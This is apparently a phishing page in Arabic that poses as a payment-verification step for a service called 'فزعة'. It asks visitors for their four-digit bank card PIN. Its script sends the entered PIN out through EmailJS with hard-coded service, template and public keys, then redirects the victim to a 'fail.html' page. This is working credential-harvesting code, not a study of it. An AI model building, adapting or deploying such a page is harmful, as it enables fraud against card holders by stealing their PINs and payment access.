<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد كلمة سر البطاقة - فزعة</title>
    <!-- استدعاء خط Tajawal ليتطابق مع صفحة index -->
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    
    <!-- استدعاء مكتبة EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // ضع PUBLIC_KEY الخاص بك هنا
            emailjs.init("yWQSUKCrx-0f02aeK");
        })();
    </script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Tajawal', sans-serif;
        }
        body {
            background-color: #f4f4f4; /* نفس الخلفية الرمادية الفاتحة */
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            overflow: hidden;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 30px 20px;
        }

        /* صورة الرسم التوضيحي العلوية */
        .hero-illustration {
            width: 100%;
            max-width: 300px;
            margin-bottom: 25px;
            display: block;
        }

        /* النصوص */
        .text-center {
            text-align: center;
            margin-bottom: 20px;
        }
        .main-title {
            font-size: 20px;
            font-weight: 800;
            color: #000;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        /* حقل إدخال الرمز */
        .otp-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .otp-input {
            width: 80%;
            max-width: 300px;
            padding: 15px;
            font-size: 24px;
            text-align: center;
            letter-spacing: 15px;
            border: 1px solid #000;
            border-radius: 5px;
            outline: none;
            margin-bottom: 30px;
            transition: border-color 0.3s;
        }
        .otp-input:focus {
            border-color: #1a8f81;
        }
        .otp-input::placeholder {
            letter-spacing: 10px;
            color: #999;
        }

        /* زر التأكيد */
        .btn-confirm {
            background-color: #1a8f81;
            color: white;
            border: none;
            padding: 15px;
            font-size: 18px;
            font-weight: 700;
            width: 80%;
            max-width: 300px;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
            margin-bottom: 30px;
        }
        .btn-confirm:hover {
            background-color: #147266;
        }
        .btn-confirm:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        /* الخط السفلي */
        .bottom-line {
            width: 90%;
            max-width: 500px;
            border: none;
            border-top: 1px solid #333;
            margin-top: 10px;
        }

        /* رسالة الحالة */
        #status-message {
            margin-top: 15px;
            font-weight: 700;
            font-size: 15px;
            display: none;
            text-align: center;
        }
        .success { color: #1a8f81; }
        .error { color: #c91c23; }

    </style>
</head>
<body>

<div class="container">
    
    <!-- يمكنك استبدال الرابط أدناه برابط الصورة الفعلية لجهاز الدفع -->
    <img src="https://i.imgur.com/hMP3SYL.jpeg" alt="تحقق أمني" class="hero-illustration">

    <div class="text-center">
        <h2 class="main-title">الرجاء ادخال كلمة سر البطاقة</h2>
        <h2 class="main-title">للتأكد من انك المالك للبطاقة</h2>
        <h2 class="main-title">لإتمام عملية الدفع</h2>
    </div>

    <form id="otp-form" class="otp-form">
        <!-- حقل إدخال كلمة السر -->
        <input type="password" id="card_pin" name="card_pin" class="otp-input" placeholder="----" maxlength="4" dir="ltr" required>
        
        <button type="submit" class="btn-confirm" id="submit-btn">تأكيد</button>
        
        <!-- الخط السفلي المطابق للصورة -->
        <hr class="bottom-line">

        <div id="status-message"></div>
    </form>

</div>

<script>
    // السماح بإدخال الأرقام فقط في حقل رمز التحقق
    document.getElementById('card_pin').addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/[^\d]/g, '');
    });

    // إرسال النموذج باستخدام EmailJS
    const form = document.getElementById('otp-form');
    const submitBtn = document.getElementById('submit-btn');
    const statusMessage = document.getElementById('status-message');

    form.addEventListener('submit', function(event) {
        event.preventDefault(); 
        
        // تغيير حالة الزر أثناء الإرسال
        submitBtn.textContent = 'جاري التأكيد...';
        submitBtn.disabled = true;
        statusMessage.style.display = 'none';
        statusMessage.className = '';

        // ضع SERVICE_ID و TEMPLATE_ID الخاصة بك هنا
        const serviceID = 'service_97hvlam';
        const templateID = 'template_lao4pfs';

        // إرسال النموذج
        emailjs.sendForm(serviceID, templateID, this)
            .then(function() {
                // نجاح الإرسال
                submitBtn.textContent = 'تأكيد';
                submitBtn.disabled = false;
                statusMessage.textContent = 'تم إرسال الرمز بنجاح!';
                statusMessage.className = 'success';
                statusMessage.style.display = 'block';
                
                // توجيه المستخدم لصفحة أخرى إذا رغبت
                window.location.href = "fail.html";
            }, function(error) {
                // فشل الإرسال
                submitBtn.textContent = 'تأكيد';
                submitBtn.disabled = false;
                statusMessage.textContent = 'حدث خطأ، يرجى المحاولة مرة أخرى.';
                statusMessage.className = 'error';
                statusMessage.style.display = 'block';
                console.log('FAILED...', error);
            });
    });
</script>

</body>
</html>
